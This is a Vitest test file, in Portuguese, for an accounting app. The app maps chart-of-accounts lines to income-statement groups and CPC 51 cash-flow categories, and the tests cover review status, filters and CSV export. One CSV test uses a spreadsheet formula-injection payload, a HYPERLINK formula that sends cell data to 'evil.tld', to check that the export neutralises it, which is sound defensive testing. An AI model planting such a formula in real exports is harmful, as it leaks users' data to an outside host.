import { describe, expect, it } from "vitest";
import { POLITICA_PADRAO, deParaCPC51 } from "../cpc51.js";
import { filtrarDePara, montarDePara, porGrupo, resumoDePara } from "../depara.js";
import { linhaCSV, situacaoDaLinha } from "../exportacaoDePara.js";

const conta = (codigo, saldo, extra = {}) => ({
  conta: codigo,
  saldo,
  historico: "",
  deb: saldo < 0 ? -saldo : 0,
  cre: saldo > 0 ? saldo : 0,
  n: 1,
  ...extra,
});

const CONTAS = [
  conta("3110101", 100000), // mensalidades → operacional
  conta("4110101", -40000), // custos → operacional
  conta("4210201", 1500, { historico: "RENDIMENTO APLICACAO, JUROS RECEBIDOS" }), // rec. financeiras → investimento, a revisar
  conta("4210101", -2500), // desp. financeiras → financiamento, a revisar
  conta("6110107", -4000), // IRPJ/CSLL → tributos
  conta("1110101", 300), // fora da DRE
];

const GRUPO = {
  "3110101": "REC_MENSALIDADES",
  "4110101": "CUSTOS",
  "4210201": "REC_FIN",
  "4210101": "DESP_FIN",
  "6110107": "IRPJ_CSLL",
};
const grupoDe = (c) => GRUPO[c] || "IGNORAR";

const montar = (opts = {}) => montarDePara(CONTAS, { grupoDe, ...opts });

describe("o De-Para descreve o destino de cada conta nos dois eixos", () => {
  it("traz uma linha por conta de resultado, da maior para a menor", () => {
    const linhas = montar();
    expect(linhas).toHaveLength(CONTAS.length);
    const valores = linhas.map((l) => Math.abs(l.saldo));
    expect(valores).toEqual([...valores].sort((a, b) => b - a));
  });

  it("usa o nome do plano de contas e cai no histórico quando não há nome", () => {
    const linhas = montar({ nomes: { "3110101": "MENSALIDADES GRADUAÇÃO" } });
    const porConta = Object.fromEntries(linhas.map((l) => [l.conta, l]));
    expect(porConta["3110101"].descricao).toBe("MENSALIDADES GRADUAÇÃO");
    expect(porConta["4210201"].descricao).toBe("RENDIMENTO APLICACAO");
  });

  it("marca a conta sem grupo como fora da DRE, e não como resolvida", () => {
    const fora = montar().find((l) => l.conta === "1110101");
    expect(fora.semGrupo).toBe(true);
    expect(fora.categoria).toBe(null);
    expect(fora.categoriaNome).toBe("Não entra na DRE");
    expect(fora.pendente).toBe(true);
  });
});

describe("a origem da decisão é registrada nos dois eixos", () => {
  it("separa grupo sugerido de grupo decidido à mão", () => {
    const linhas = montar({ tocadas: { "4110101": true } });
    const porConta = Object.fromEntries(linhas.map((l) => [l.conta, l]));
    expect(porConta["4110101"].origemGrupo).toBe("manual");
    expect(porConta["3110101"].origemGrupo).toBe("sugerido");
  });

  it("uma categoria escolhida à mão encerra o pedido de revisão daquela conta", () => {
    const antes = montar().find((l) => l.conta === "4210201");
    expect(antes.revisar).toBeTruthy();
    expect(antes.origemCategoria).toBe("padrão do grupo");

    const depois = montar({ categoriaPorConta: { "4210201": "OPERACIONAL" } })
      .find((l) => l.conta === "4210201");
    expect(depois.categoria).toBe("OPERACIONAL");
    expect(depois.categoriaManual).toBe(true);
    expect(depois.revisar).toBe(null);
    expect(depois.pendente).toBe(false);
  });

  it("a política contábil também encerra a revisão, sem decisão conta a conta", () => {
    const linhas = montar({ politica: { ...POLITICA_PADRAO, financiarClientesEhAtividadePrincipal: true } });
    const desp = linhas.find((l) => l.conta === "4210101");
    expect(desp.categoria).toBe("OPERACIONAL");
    expect(desp.revisar).toBe(null);
  });
});

describe("o resumo conta o trabalho que falta, não o que já tem rótulo", () => {
  it("não considera resolvida a conta fora da DRE nem a que pede revisão", () => {
    const r = resumoDePara(montar());
    expect(r.total).toBe(6);
    expect(r.comGrupo).toBe(5);
    expect(r.semGrupo).toBe(1);
    expect(r.valorSemGrupo).toBeCloseTo(300, 2);
    expect(r.aRevisar).toBe(2); // as duas financeiras
    expect(r.valorARevisar).toBeCloseTo(4000, 2);
    expect(r.resolvidas).toBe(3);
    expect(r.completude).toBeCloseTo(3 / 6, 5);
  });

  it("sobe a completude conforme as pendências são decididas", () => {
    const r = resumoDePara(montar({
      categoriaPorConta: { "4210201": "OPERACIONAL", "4210101": "FINANCIAMENTO" },
    }));
    expect(r.aRevisar).toBe(0);
    expect(r.manuaisCategoria).toBe(2);
    expect(r.resolvidas).toBe(5);
  });
});

describe("filtros e agrupamento por destino", () => {
  it("filtra por situação, grupo e busca", () => {
    const linhas = montar({ tocadas: { "4110101": true } });
    expect(filtrarDePara(linhas, { situacao: "pendentes" }).map((l) => l.conta).sort())
      .toEqual(["1110101", "4210101", "4210201"]);
    expect(filtrarDePara(linhas, { situacao: "sem-grupo" })).toHaveLength(1);
    expect(filtrarDePara(linhas, { situacao: "manuais" }).map((l) => l.conta)).toEqual(["4110101"]);
    expect(filtrarDePara(linhas, { grupo: "CUSTOS" })).toHaveLength(1);
    expect(filtrarDePara(linhas, { categoria: "TRIBUTOS" }).map((l) => l.conta)).toEqual(["6110107"]);
    expect(filtrarDePara(linhas, { busca: "3110101" })).toHaveLength(1);
  });

  it("a leitura por grupo sai na ordem da DRE e conta o que falta revisar", () => {
    const grupos = porGrupo(montar());
    expect(grupos.map((g) => g.id)).toEqual([
      "REC_MENSALIDADES", "CUSTOS", "REC_FIN", "DESP_FIN", "IRPJ_CSLL", "IGNORAR",
    ]);
    expect(grupos.find((g) => g.id === "REC_FIN").aRevisar).toBe(1);
  });

  it("resume a situação de cada linha numa palavra só", () => {
    const linhas = montar({ tocadas: { "4110101": true } });
    const situacao = Object.fromEntries(linhas.map((l) => [l.conta, situacaoDaLinha(l)]));
    expect(situacao["1110101"]).toBe("Fora da DRE");
    expect(situacao["4210201"]).toBe("A revisar");
    expect(situacao["4110101"]).toBe("Decidida");
    expect(situacao["3110101"]).toBe("Automática");
  });
});

describe("o CSV protege o texto sem estragar o número", () => {
  it("neutraliza fórmula na descrição e deixa a despesa somável", () => {
    const linhas = montarDePara(
      [conta("4110101", -40000), conta("3110101", 100000)],
      { grupoDe, nomes: { "4110101": '=HYPERLINK("http://evil.tld?d="&A1,"clique")' } }
    );
    const csv = Object.fromEntries(linhas.map((l) => [l.conta, linhaCSV(l)]));

    // o texto vindo do plano de contas continua desarmado...
    expect(csv["4110101"]).toContain(`"'=HYPERLINK`);
    // ...e o valor negativo NÃO vira texto com aspa: o Excel precisa somá-lo
    expect(csv["4110101"].endsWith('"-40000,00"')).toBe(true);
    expect(csv["3110101"].endsWith('"100000,00"')).toBe(true);
  });
});

/* A garantia que impede as duas tabelas de divergirem. `deParaCPC51`
   continua sendo a fonte do entregável da Fase 2 (o Excel de seis abas)
   e `montarDePara` é a fonte da tela e do arquivo de parametrização —
   se um dia elas discordarem sobre o destino de uma conta, o app estaria
   dizendo duas coisas diferentes sobre o mesmo fato. */
describe("acordo com o De-Para do CPC 51", () => {
  it("as duas tabelas concordam conta a conta sobre grupo e categoria", () => {
    const opts = { grupoDe, categoriaPorConta: { "4210201": "OPERACIONAL" }, politica: POLITICA_PADRAO, nomes: {} };
    const a = montarDePara(CONTAS, opts);
    const b = deParaCPC51(CONTAS, opts);
    expect(a).toHaveLength(b.length);
    const porConta = Object.fromEntries(b.map((l) => [l.conta, l]));
    a.forEach((l) => {
      expect(l.grupo).toBe(porConta[l.conta].grupo);
      expect(l.categoria).toBe(porConta[l.conta].categoria);
      expect(l.categoriaNome).toBe(porConta[l.conta].categoriaNome);
      expect(l.saldo).toBeCloseTo(porConta[l.conta].saldo, 2);
    });
  });
});
